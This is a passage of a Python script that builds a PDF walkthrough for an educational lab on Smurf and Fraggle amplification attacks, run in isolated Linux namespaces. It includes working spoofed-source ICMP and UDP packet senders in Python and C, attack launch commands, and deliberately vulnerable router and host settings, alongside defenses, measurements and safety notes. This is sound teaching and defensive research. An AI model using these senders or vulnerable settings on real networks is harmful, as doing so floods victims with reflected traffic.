       "    return struct.pack(\"!BBHHHBBH4s4s\", *fields)     # checksum filled\n\n"
       "def build_icmp_echo(icmp_id, seq, payload):\n"
       "    head = struct.pack(\"!BBHHH\", 8, 0, 0, icmp_id, seq)  # type 8, code 0\n"
       "    chk = checksum(head + payload)\n"
       "    return struct.pack(\"!BBHHH\", 8, 0, chk, icmp_id, seq) + payload"))
    a(("p", "The main loop sends args.count packets. It sleeps for one over the "
        "rate between packets. An optional payload pads each packet to raise the "
        "bandwidth amplification."))
    a(("code",
       "ip netns exec attacker python3 smurf.py \\\n"
       "    --victim 10.0.20.100 --broadcast 10.0.10.255 --count 100 --rate 50"))
    a(("h2", "6.4 The ICMP Smurf sender in C (smurf.c)"))
    a(("p", "The C sender is the report deliverable. Its design matches smurf.py. "
        "It opens the same raw socket. It fills the struct iphdr and the struct "
        "icmphdr. It computes both checksums with its own function. It sends the "
        "packet in a loop with nanosleep for the rate."))
    a(("code",
       "int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);\n"
       "setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));\n"
       "ip->version = 4; ip->ihl = 5; ip->ttl = 64; ip->protocol = IPPROTO_ICMP;\n"
       "inet_pton(AF_INET, victim, &ip->saddr);   /* spoofed source */\n"
       "inet_pton(AF_INET, bcast,  &ip->daddr);   /* directed broadcast */\n"
       "ip->check = htons(checksum(ip, sizeof(struct iphdr)));\n"
       "ic->type = ICMP_ECHO; ic->code = 0;       /* type 8 */\n"
       "ic->checksum = htons(checksum(ic, icmp_len));\n"
       "sendto(s, pkt, tot, 0, (struct sockaddr *)&dst, sizeof(dst));"))
    a(("p", "The C binary is built on demand by run_attack.sh. The command below "
        "gives the same result as the Python sender."))
    a(("code",
       "gcc -O2 -Wall -o smurf smurf.c\n"
       "ip netns exec attacker ./smurf 10.0.20.100 10.0.10.255 50 100 0"))
    a(("h2", "6.5 The UDP Fraggle sender (fraggle.py)"))
    a(("p", "The Fraggle sender is the Smurf sender over UDP. It sets the IP "
        "protocol field to 17. It builds a UDP header with a source port and a "
        "destination port. The interesting part is the UDP checksum. It covers a "
        "12-byte pseudo-header as well as the UDP header and the payload (RFC "
        "768)."))
    a(("p", "The pseudo-header holds the source IP, the destination IP, a zero "
        "byte, the protocol number, and the UDP length. A computed UDP checksum of "
        "zero is sent as 0xFFFF, because zero means \"no checksum\"."))
    a(("code",
       "def build_udp(src, dst, sport, dport, payload):\n"
       "    udp_len = 8 + len(payload)\n"
       "    pseudo = (socket.inet_aton(src) + socket.inet_aton(dst)\n"
       "              + struct.pack(\"!BBH\", 0, socket.IPPROTO_UDP, udp_len))\n"
       "    head0 = struct.pack(\"!HHHH\", sport, dport, udp_len, 0)  # cksum 0\n"
       "    chk = checksum(pseudo + head0 + payload)\n"
       "    if chk == 0:\n"
       "        chk = 0xFFFF     # a computed 0 is transmitted as 0xFFFF\n"
       "    return struct.pack(\"!HHHH\", sport, dport, udp_len, chk) + payload"))
    a(("code",
       "ip netns exec attacker python3 fraggle.py \\\n"
       "    --victim 10.0.20.100 --broadcast 10.0.10.255 \\\n"
       "    --dport 7 --sport 40000 --count 100 --rate 50"))
    a(("h2", "6.6 The UDP Fraggle sender in C (fraggle.c)"))
    a(("p", "The C Fraggle sender matches fraggle.py. It builds the pseudo-header "
        "in a separate buffer. It copies the source IP, the destination IP, the "
        "protocol, and the UDP length. It appends the UDP header and payload. It "
        "computes the checksum over the whole buffer."))
    a(("code",
       "int pslen = 12 + udp_len;\n"
       "memcpy(ps + 0, &ip->saddr, 4);\n"
       "memcpy(ps + 4, &ip->daddr, 4);\n"
       "ps[9]  = IPPROTO_UDP;\n"
       "ps[10] = (udp_len >> 8) & 0xff;\n"
       "ps[11] = udp_len & 0xff;\n"
       "memcpy(ps + 12, ud, udp_len);\n"
       "unsigned short uck = checksum(ps, pslen);\n"
       "ud->check = htons(uck ? uck : 0xffff);   /* 0 is transmitted as 0xFFFF */"))
    a(("h2", "6.7 The UDP echo amplifier (udp_echo.py)"))
    a(("p", "This service is the Fraggle amplifier. It is a small, correct UDP "
        "echo server (RFC 862). It binds 0.0.0.0 on the echo port. So it also "
        "receives packets sent to the subnet broadcast. It echoes each datagram "
        "back to its sender. Under the attack the sender is the spoofed victim."))
    a(("p", "The service is not the vulnerability. It is an ordinary echo server. "
        "The amplification comes from the router forwarding the directed "
        "broadcast, exactly as with Smurf."))
    a(("code",
       "s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n"
       "s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)\n"
       "s.bind((\"0.0.0.0\", port))\n"
       "while True:\n"
       "    data, addr = s.recvfrom(65535)\n"
       "    s.sendto(data, addr)          # echo back to the (spoofed) sender"))
    a(("h2", "6.8 The deliberately vulnerable settings"))
    a(("p", "The table below lists every vulnerable setting. It gives the "
        "vulnerable value and the secure default. The defend.sh script flips these "
        "back. The teardown script removes them all."))
    a(("table", [
        ["Where", "Setting or state", "Vulnerable", "Secure default"],
        ["router", "net.ipv4.ip_forward", "1", "1 (routing)"],
        ["router", "net.ipv4.conf.*.bc_forwarding", "1", "0"],
        ["router", "net.ipv4.conf.*.rp_filter", "0", "1 or 2"],
        ["amp1-N", "net.ipv4.icmp_echo_ignore_broadcasts", "0", "1"],
        ["amp1-N", "UDP echo service (udp_echo.py)", "running", "not present"],
        ["edge", "IP source guard on attacker port", "absent", "present (BCP 38)"],
    ], [0.7, 2.4, 1.0, 1.1]))

    # ---------------------------------------------------------------
    a(("h1", "7. Running the Attack and Measuring"))
    a(("h2", "7.1 The attack launcher (run_attack.sh)"))
    a(("p", "This script launches one sender in the attacker namespace. It picks "
        "the protocol and the engine from its options. It reads the default "
        "addresses from lab.env. It builds the C binary on demand if the engine is "
        "C."))
    a(("table", [
        ["Option", "Default", "Meaning"],
        ["--proto", "icmp", "icmp for Smurf, or udp for Fraggle."],
        ["--engine", "py", "py for the Python sender, or c for the C sender."],
        ["--count", "100", "The number of requests to send."],
        ["--rate", "50", "The send rate in packets per second."],
        ["--size", "0", "The payload size in bytes."],
        ["--victim", "10.0.20.100", "The spoofed source and flood target."],
        ["--broadcast", "10.0.10.255", "The directed-broadcast destination."],
        ["--dport / --sport", "7 / 40000", "The UDP ports (Fraggle only)."],
    ], [1.3, 1.2, 3.0]))
    a(("p", "The build_c helper rebuilds a C binary only if the source is newer "
        "than the binary. So a repeat run is fast."))
    a(("code",
       "sudo bash run_attack.sh --engine c  --count 100 --rate 50     # C Smurf\n"
       "sudo bash run_attack.sh --proto udp --engine c --count 100    # C Fraggle\n"
       "sudo bash run_attack.sh --proto udp --engine py --count 1     # one packet"))
    a(("h2", "7.2 The measurement harness (measure.sh)"))
    a(("p", "This script runs one spoofed attack and reports the amplification "
        "factor. It counts the replies at the victim in two independent ways. So "
        "it works with or without tcpdump."))
    a(("num", [
        "It reads the victim's kernel counters before the attack. For ICMP it "
        "reads IcmpMsg InType0. For UDP it reads Udp NoPorts.",
        "It starts a tcpdump capture on the victim's link, if tcpdump is present.",
        "It fires the attack through run_attack.sh.",
        "It reads the counters again. It counts the pcap replies. It computes the "
        "factor as replies divided by requests.",
        "It appends one row to results/summary.tsv.",
    ]))
    a(("note", "Why the UDP counter is Udp NoPorts",
       "The victim does not listen on the spoofed source port (40000). So every "
       "echoed reply hits a closed port. The kernel counts each one under Udp "
       "NoPorts. This gives a deterministic count with no listener.", AMPC))
    a(("code",
       "sudo bash measure.sh --label vuln                 # ICMP Smurf -> ~3.00\n"
       "sudo bash measure.sh --proto udp --label vuln     # UDP Fraggle -> ~3.00\n\n"
       "  requests sent                100\n"
       "  replies (pcap)               300\n"
       "  replies (IcmpMsg InType0)    300\n"
       "  AMPLIFICATION FACTOR         3.00"))
    a(("h2", "7.3 The full matrix (run_all.sh)"))
    a(("p", "This script reproduces the whole study in one command. It builds a "
        "fresh lab. It runs the vulnerable baseline for both protocols and both "
        "engines. It then applies each defense alone and measures it. It reverts "
        "between the defenses so each one is measured in isolation. It ends with a "
        "revert and a recheck."))
    a(("code",
       "== Vulnerable baseline (both senders, both protocols) ==\n"
       "== Defense: router (bc_forwarding=0)   -> expect BOTH collapse to 0 ==\n"
       "== Defense: amps (icmp ignore)         -> expect Smurf 0, Fraggle 3 ==\n"
       "== Defense: service (stop UDP echo)    -> expect Fraggle 0, Smurf 3 ==\n"
       "== Defense: spoofguard (edge guard)    -> expect BOTH collapse to 0 ==\n"
       "== Revert -> recheck (still vulnerable) =="))
    a(("h2", "7.4 The scaling experiment (scale_test.sh)"))
    a(("p", "This script shows that the factor scales with the number of "
        "amplifiers. For each k from 1 to AMP_COUNT it enables exactly k "
        "amplifiers. The other amplifiers are told to ignore broadcast echo. It "
        "fires the same Smurf attack. It reads the victim's echo-reply counter."))
    a(("p", "The result is a dose-response table and a small bar chart. The script "
        "writes the table to results/scaling.tsv. It leaves the lab fully "
        "vulnerable again at the end."))
    a(("code",
       "enable_k() {   # amps 1..k answer; amps k+1..N stay silent\n"
       "  for i in $(seq 1 \"$AMP_COUNT\"); do\n"
       "    [ \"$i\" -le \"$k\" ] && v=0 || v=1     # 0 = answer, 1 = ignore\n"
       "    ip netns exec \"amp$i\" sysctl -qw net.ipv4.icmp_echo_ignore_broadcasts=$v\n"
       "  done\n"
       "}"))

    # ---------------------------------------------------------------
    a(("h1", "8. The Defenses (defend.sh)"))
    a(("p", "The defend.sh script applies or reverts the defenses. It can apply "
        "one layer alone or every layer at once. This lets the lab measure each "
        "layer in isolation."))
    a(("h2", "8.1 Layer 1: the router fix (universal)"))
    a(("p", "This layer sets bc_forwarding to 0 on the router. This is the "
        "root-cause fix. One packet stays one packet. The router drops the "
        "broadcast instead of flooding it. This stops both Smurf and Fraggle."))
    a(("code",
       "ip netns exec router sysctl -qw net.ipv4.conf.all.bc_forwarding=0\n"
       "ip netns exec router sysctl -qw net.ipv4.conf.br-amp.bc_forwarding=0\n"
       "ip netns exec router sysctl -qw net.ipv4.conf.br-vic.bc_forwarding=0"))
    a(("h2", "8.2 Layer 2: the ICMP host fix (Smurf only)"))
    a(("p", "This layer sets icmp_echo_ignore_broadcasts to 1 on each amplifier. "
        "This is the classic host-side fix from RFC 2644. It silences ICMP "
        "broadcast replies. It has no effect on Fraggle, because the UDP echo "
        "service still answers."))
    a(("h2", "8.3 Layer 3: the UDP host fix (Fraggle only)"))
    a(("p", "This layer stops the UDP echo service on each amplifier. Without the "
        "responder, Fraggle gets no replies. It does not stop Smurf, because the "
        "kernel's ICMP reply path is separate."))
    a(("code", "pkill -f \"src/udp_echo.py\""))
    a(("h2", "8.4 Layer 4: the edge source guard (universal)"))
    a(("p", "This layer installs an nftables bridge-family rule on the attacker's "
        "access port. The rule drops any frame whose IP source is not the "
        "attacker's real address. So the spoofed packet never reaches the router. "
        "Both attacks collapse to zero."))
    a(("code",
       "table bridge smurf_sg {\n"
       "    chain pre {\n"
       "        type filter hook prerouting priority -300; policy accept;\n"
       "        iif \"r-att\" ip saddr != 10.0.20.50 counter drop\n"
       "    }\n"
       "}"))
    a(("p", "The script first checks that the kernel has the nftables bridge "
        "family. Some kernels, such as Google Cloud Shell, do not have it. If it "
        "is absent, the script skips this one layer and returns a special exit "
        "code. The other defenses still work."))
    a(("note", "Why per-port, and not plain uRPF",
       "The source guard validates the attacker's own switch port. Plain subnet "
       "uRPF would not catch this spoof. The forged victim address is itself valid "
       "on the victim subnet. So only per-port source validation can tell the "
       "attacker's real IP from the spoofed victim IP.", PRIMARY))
    a(("h2", "8.5 The combined modes"))
    a(("kv", [
        ("both", "Apply the router fix and the ICMP host fix. This is the default "
         "and the pair of classic fixes."),
        ("all", "Apply every layer: router, amps, service, and spoofguard. This is "
         "defense in depth."),
        ("revert", "Restore the full vulnerable configuration. This lets you "
         "demonstrate the attack again."),
    ]))
    a(("h2", "8.6 The defense matrix"))
    a(("p", "The table below is the heart of the lab. Each defense is applied "
        "alone. The value is the measured amplification factor. A factor of 0.00 "
        "means the attack is stopped."))
    a(("table", [
        ["Defense (applied alone)", "Layer", "Smurf", "Fraggle", "Universal?"],
        ["bc_forwarding=0 (router)", "router forwarding", "0.00", "0.00", "YES"],
        ["icmp_echo_ignore_broadcasts=1", "ICMP host", "0.00", "3.00", "no (ICMP)"],
        ["stop UDP echo service", "UDP host", "3.00", "0.00", "no (UDP)"],
        ["edge IP source guard", "source validation", "0.00", "0.00", "YES"],
    ], [2.3, 1.5, 0.8, 0.9, 1.2]))
    a(("p", "The matrix proves the thesis. The router fix and the edge guard each "
        "stop both attacks, because they attack the root cause. The ICMP host fix "
        "stops only Smurf. The UDP host fix stops only Fraggle. So a per-protocol "
        "fix always leaves the other attack open."))

    # ---------------------------------------------------------------
    a(("h1", "9. Results and Evidence"))
    a(("p", "This chapter gives the measured numbers. The environment is Ubuntu "
        "24.04 with Linux kernel 6.18. There are three amplifiers. Each run sends "
        "100 requests at 50 packets per second."))
    a(("h2", "9.1 The attack works, for both protocols and both engines"))
    a(("table", [
        ["Scenario", "Sender", "Proto", "Sent", "Replies", "Factor"],
        ["Vulnerable", "smurf.py", "ICMP", "100", "300", "3.00"],
        ["Vulnerable", "smurf.c", "ICMP", "100", "300", "3.00"],
        ["Vulnerable", "fraggle.py", "UDP", "100", "300", "3.00"],
        ["Vulnerable", "fraggle.c", "UDP", "100", "300", "3.00"],
        ["Revert -> recheck", "smurf.py", "ICMP", "100", "300", "3.00"],
        ["Revert -> recheck", "fraggle.py", "UDP", "100", "300", "3.00"],
    ], [1.6, 1.3, 0.8, 0.7, 0.9, 0.8]))
    a(("p", "Both protocols amplify the same way. Both engines give the same "
        "result. This confirms that the hand-written headers and all three "
        "checksums are correct."))
    a(("h2", "9.2 The defense results"))
    a(("p", "The summary.tsv file records each run. The rows below show the four "
        "defenses. The router fix and the source guard drive both attacks to zero. "
        "The ICMP fix leaves Fraggle at 3.00. The service fix leaves Smurf at "
        "3.00."))
    a(("table", [
        ["Label", "Proto", "Sent", "pcap", "kernel", "Factor"],
        ["defended-router-icmp", "icmp", "100", "0", "0", "0.00"],
        ["defended-router-fraggle", "udp", "100", "0", "0", "0.00"],
        ["defended-amps-icmp", "icmp", "100", "0", "0", "0.00"],
        ["defended-amps-fraggle", "udp", "100", "300", "300", "3.00"],
        ["defended-service-icmp", "icmp", "100", "300", "300", "3.00"],
        ["defended-service-fraggle", "udp", "100", "0", "0", "0.00"],
        ["defended-spoofguard-icmp", "icmp", "100", "0", "0", "0.00"],
        ["defended-spoofguard-fraggle", "udp", "100", "0", "0", "0.00"],
    ], [2.4, 0.9, 0.8, 0.8, 0.9, 0.9]))
    a(("h2", "9.3 The amplification scales with the number of amplifiers"))
    a(("p", "The scale_test.sh script enables k amplifiers and fires the same "
        "attack. The factor tracks k exactly. The sweep runs from 1 to 8."))
    a(("table", [
        ["Live amplifiers (k)", "Sent", "Replies", "Factor"],
        ["1", "100", "100", "1.00"],
        ["2", "100", "200", "2.00"],
        ["3", "100", "300", "3.00"],
        ["4", "100", "400", "4.00"],
        ["5", "100", "500", "5.00"],
        ["6", "100", "600", "6.00"],
        ["7", "100", "700", "7.00"],
        ["8", "100", "800", "8.00"],
    ], [1.6, 1.0, 1.0, 1.0]))
    a(("p", "The result is factor(k) = k. A real directed broadcast reaches every "
        "host on the subnet. So a production /24 network with hundreds of "
        "responders gives a multiplier of three orders of magnitude from one "
        "spoofed packet. This is why Smurf was so dangerous before RFC 2644."))
    a(("h2", "9.4 The packet-path proof"))
    a(("p", "The traces below come from the live captures. For Smurf, one "
        "broadcast request is forwarded by the router. It becomes a link-layer "
        "broadcast. All three amplifiers reply to the victim."))
    a(("code",
       "router br-vic (in):  10.0.20.50 > 10.0.10.255: ICMP echo request\n"
       "router br-amp (out): 10.0.20.50 > 10.0.10.255: ICMP echo request  <- forwarded\n"
       "amp1 eth0: .. > ff:ff:ff:ff:ff:ff  10.0.20.50 > 10.0.10.255  echo request\n"
       "router br-vic (in):  10.0.10.11 > 10.0.20.50: ICMP echo reply\n"
       "                     10.0.10.12 > 10.0.20.50: ICMP echo reply\n"
       "                     10.0.10.13 > 10.0.20.50: ICMP echo reply       <- 3 replies"))
    a(("p", "For Fraggle, the same amplification happens over UDP echo. One "
        "request draws one reply from each amplifier. The attacker's address never "
        "appears."))
    a(("code",
       "10.0.10.11.7 > 10.0.20.100.40000: UDP, length 7\n"
       "10.0.10.13.7 > 10.0.20.100.40000: UDP, length 7\n"
       "10.0.10.12.7 > 10.0.20.100.40000: UDP, length 7    <- 3 replies, one per amp"))
    a(("h2", "9.5 The four perspectives"))
    a(("kv", [
        ("Attacker (.50)", "It sees only its own send log. It receives no replies, "
         "because every reply goes to the spoofed victim. Its real IP never "
         "appears in the flood."),
        ("Victim (.100)", "It receives a flood of replies from all amplifiers. It "
         "never sent a request. It does not know the attacker exists."),
        ("Router", "It is the enabler. With bc_forwarding=1 it forwards the "
         "directed broadcast as a link-layer broadcast. With rp_filter=0 it does "
         "not check the forged source."),
        ("Amplifiers", "Each one receives the broadcast and replies to the "
         "requester. From its view it answers a normal request. It does not know "
         "the source is forged."),
    ]))
    a(("h2", "9.6 The evidence files"))
    a(("bul", [
        "summary.tsv holds one row per run. The columns are timestamp, proto, "
        "label, engine, sent, pcap, kernel, and factor.",
        "scaling.tsv holds the amplifier-count sweep.",
        "The pcap files hold the victim-side captures, one per run.",
        "RESULTS.md explains all of the above in prose.",
    ]))
    a(("p", "You can verify any capture on your own. The commands below count the "
        "replies in a pcap file."))
    a(("code",
       "tcpdump -r results/vulnerable-icmp-py-*.pcap 'icmp[0] = 0' | wc -l   # -> 300\n"
       "tcpdump -r results/vulnerable-fraggle-py-*.pcap 'udp and dst port 40000' \\\n"
       "        | wc -l                                                       # -> 300\n"
       "tcpdump -r results/defended-router-icmp-*.pcap 'icmp[0] = 0' | wc -l  # -> 0"))

    # ---------------------------------------------------------------
    a(("h1", "10. Teardown and Safety"))
    a(("h2", "10.1 The teardown (teardown_lab.sh)"))
    a(("p", "The teardown script removes the whole lab. It stops the echo "
        "responders. It removes the source-guard table. It deletes every "
        "namespace. When a namespace is deleted, its interfaces go with it. A "
        "veth peer vanishes with its partner. The bridges go with the router "
        "namespace."))
    a(("p", "The script also removes any stray veth in the root namespace. A "
        "healthy run leaves none. This step is a safeguard against a crashed "
        "setup."))
    a(("h2", "10.2 The safety invariants"))
    a(("bul", [
        "All six namespaces are internal. Nothing is bridged to a real network "
        "card. So there is no route to the internet or a campus network.",
        "The vulnerable sysctls and the echo responders live only inside the "
        "namespaces. The teardown removes them all.",
        "The packet rate is low and instrumented. The point is the multiplier, not "
        "the throughput.",
        "The preflight script checks the kernel before the lab is built.",
    ]))

    # ---------------------------------------------------------------
    a(("h1", "11. Reproduce It Yourself"))
    a(("p", "This chapter gives the full run order. Run every command from inside "
        "the lab directory. Each command needs root."))
    a(("h2", "11.1 The step-by-step run"))
    a(("code",
       "cd lab\n"
       "sudo bash preflight.sh                         # check the kernel first\n"
       "sudo bash setup_lab.sh                         # build lab + vulnerable config\n"
       "sudo bash measure.sh --label vuln             # ICMP Smurf   -> ~3.00\n"
       "sudo bash measure.sh --proto udp --label vuln # UDP Fraggle  -> ~3.00\n"
       "sudo bash defend.sh both                       # apply the classic fixes\n"
       "sudo bash measure.sh --label defended         # re-run -> collapses to 0\n"
       "sudo bash teardown_lab.sh                      # remove everything"))
    a(("h2", "11.2 The one-command runs"))
    a(("code",
       "sudo bash run_all.sh                           # the whole attack/defense matrix\n"
       "sudo AMP_COUNT=8 bash setup_lab.sh >/dev/null && sudo bash scale_test.sh"))
    a(("p", "The full matrix takes about three minutes. It rebuilds every row of "
        "summary.tsv and every pcap. The scaling sweep rebuilds scaling.tsv."))

    # ---------------------------------------------------------------
    a(("h1", "12. The Cloud Shell Tutorial (tutorial.md)"))
    a(("p", "The repository has a Google Cloud Shell tutorial. The README has an "
        "\"Open in Cloud Shell\" button. The button clones the repository and "
        "opens the tutorial in the Cloud Shell editor. The tutorial is a "
        "click-through with these steps."))
    a(("num", [
        "Install the optional tools tcpdump and iputils-ping. Then run "
        "preflight.sh.",
        "Build the lab with setup_lab.sh. Watch the self-test confirm the "
        "amplification.",
        "Run the full matrix with run_all.sh. Watch the amplification factors.",
        "Run the scaling sweep with AMP_COUNT=8 and scale_test.sh.",
        "View the results with column -t on the TSV files. Verify a pcap with "
        "tcpdump.",
        "Clean up with teardown_lab.sh. Nothing persists.",
    ]))
    a(("note", "Cloud Shell and the spoofguard layer",
       "The Cloud Shell kernel usually lacks the nftables bridge family. So the "
       "spoofguard layer is skipped there. The router, amps, and service defenses "
       "still cover both attacks.", AMBER))

    # ---------------------------------------------------------------
    a(("h1", "13. The Slide Deck (slides/smurf_fraggle_slides.tex)"))
    a(("p", "The repository has a Beamer slide deck in LaTeX. It summarizes the "
        "whole lab for a presentation. Build it with pdflatex. Run pdflatex twice "
        "so the table of contents is correct. The deck needs the beamer, tikz, "
        "pgfplots, and booktabs packages."))
    a(("p", "The deck has these sections: the attack, the lab setup, the "
        "measurement and results, the defenses, the scaling, and the tooling and "
        "safety. It has TikZ diagrams of the topology and the packet path. It has "
        "pgfplots bar charts of the defense matrix and the scaling curve."))
    a(("code",
       "pdflatex smurf_fraggle_slides.tex\n"
       "pdflatex smurf_fraggle_slides.tex     # run twice for the TOC"))

    # ---------------------------------------------------------------
    a(("h1", "14. The Two Reports"))
    a(("h2", "14.1 The design report (Smurf_Attack_Design_Report_4.pdf)"))
    a(("p", "This report is the first deliverable. It designs the classic ICMP "
        "Smurf attack. It has seven parts: the overview, the topology and timing, "
        "the packet and frame structure, the justification, the implementation "
        "plan, the expected outcome, and the defense idea."))
    a(("p", "The report explains why the design must work. It rests on three "
        "protocol behaviours. A host replies to an echo request. A directed "
        "broadcast reaches every host. IP does not verify the source address. The "
        "report also states the responsible-conduct rule: the code runs only in an "
        "isolated lab."))
    a(("h2", "14.2 The final report (Final_Report_Group05_A2.pdf)"))
    a(("p", "This report is the results deliverable. It has nine sections: the lab "
        "environment, the attack implementation, the results, the observed output "
        "from each perspective, the countermeasure taxonomy, the scaling "
        "experiment, the code design, the evidence files, and the conclusion."))
    a(("p", "The final report confirms the design with real measurements. Both "
        "attacks reach a factor of exactly 3.00 with three amplifiers. The two "
        "measurement methods agree. The factor scales linearly to eight "
        "amplifiers. The report concludes that the misconfiguration, not the "
        "protocol, is the vulnerability."))

    # ---------------------------------------------------------------
    a(("h1", "15. Glossary"))
    a(("kv", [
        ("Amplification factor", "Replies at the victim divided by requests sent. "
         "Equal to the number of live amplifiers."),
        ("bc_forwarding", "The Linux sysctl that forwards directed broadcasts. It "
         "is the root cause of the attack."),
        ("BCP 38", "Best current practice for ingress filtering. It drops packets "
         "with a forged source address."),
        ("Directed broadcast", "A packet addressed to a subnet's broadcast address. "
         "It is meant for every host on that subnet."),
        ("Fraggle", "The UDP version of the Smurf attack. It uses the UDP echo "
         "service instead of ICMP echo."),
        ("IP_HDRINCL", "A raw-socket option. It lets the program provide the full "
         "IP header, including the source."),
        ("Network namespace", "An isolated virtual network stack inside one Linux "
         "kernel."),
        ("Reflection", "Bouncing packets off third-party hosts so they hit the "
         "victim, not the attacker."),
        ("rp_filter", "The reverse-path filter. It can drop a packet whose source "
         "does not match the route back."),
        ("Smurf", "The ICMP directed-broadcast amplification attack. Named after "
         "the 1997 program smurf.c."),
        ("Spoofing", "Forging the IP source address of a packet."),
        ("uRPF", "Unicast reverse-path forwarding. A route-based anti-spoof check."),
        ("veth pair", "A pair of linked virtual interfaces. It connects a host "
         "namespace to a bridge."),
    ]))

    # ---------------------------------------------------------------
    a(("h1", "16. Quick Reference"))
    a(("h2", "16.1 The scripts"))
    a(("table", [
        ["Script", "What it does"],
        ["preflight.sh", "Check the kernel can run the lab."],
        ["setup_lab.sh", "Build the namespaces and the vulnerable config."],
        ["teardown_lab.sh", "Remove everything."],
        ["run_attack.sh", "Launch one sender in the attacker namespace."],
        ["measure.sh", "Run one attack and compute the factor."],
        ["defend.sh", "Apply or revert one or more defense layers."],
        ["run_all.sh", "Reproduce the whole attack/defense matrix."],
        ["scale_test.sh", "Sweep the amplifier count from 1 to N."],
    ], [1.2, 3.0]))
    a(("h2", "16.2 The defend.sh modes"))
    a(("table", [
        ["Mode", "Stops Smurf", "Stops Fraggle"],
        ["router", "yes", "yes"],
        ["amps", "yes", "no"],
        ["service", "no", "yes"],
        ["spoofguard", "yes", "yes"],
        ["both (router + amps)", "yes", "yes"],
        ["all (every layer)", "yes", "yes"],
        ["revert", "restores the vulnerable config", ""],
    ], [1.6, 1.0, 1.0]))
    a(("h2", "16.3 The source files"))
    a(("table", [
        ["File", "Role"],
        ["src/smurf.py", "ICMP Smurf sender (Python, bring-up)."],
        ["src/smurf.c", "ICMP Smurf sender (C, deliverable)."],
        ["src/fraggle.py", "UDP Fraggle sender (Python)."],
        ["src/fraggle.c", "UDP Fraggle sender (C)."],
        ["src/udp_echo.py", "The UDP echo amplifier service."],
    ], [1.3, 3.0]))
    a(("space", 4))
    a(("rule",))
    a(("caption", "End of the walkthrough. Reproduce every result with "
       "'sudo bash run_all.sh' and 'sudo bash scale_test.sh'."))
    return B


def main():
    pdf = Walkthrough(TITLE, SUBTITLE, FOOTER)
    build_cover(pdf)
    pdf.add_page()
    pdf.insert_toc_placeholder(render_toc, allow_extra_pages=True)
    pdf.render(content())
    out = "Smurf_Fraggle_Lab_Walkthrough.pdf"
    pdf.output(out)
    print("wrote", out)


if __name__ == "__main__":
    main()
